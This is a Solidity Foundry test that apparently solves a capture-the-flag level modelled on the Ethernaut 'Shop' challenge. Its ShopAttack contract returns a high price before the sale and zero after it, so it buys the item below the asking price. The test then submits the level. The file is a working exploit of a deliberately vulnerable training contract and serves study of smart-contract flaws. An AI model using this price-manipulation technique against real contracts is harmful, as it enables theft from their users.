// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

interface IShop {
  function buy() external;
  function isSold() external view returns (bool);
}

contract ShopAttack {
  IShop internal challenge;

  constructor(address challengeAddress) {
    challenge = IShop(challengeAddress);
  }

  function attack() public {
    challenge.buy();
  }

  function price() public view returns (uint) {
    if (challenge.isSold()) {
      return 0;
    }
    return 100;
  }
}

contract ShopTest is Test {
  address internal challengeAddress;
  ShopAttack internal attackContract;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x691eeA9286124c043B82997201E805646b76351a);
    attackContract = new ShopAttack(challengeAddress);
  }

  function testExploit() public {
    attackContract.attack();
    utils.submitLevelInstance(challengeAddress);
  }
}
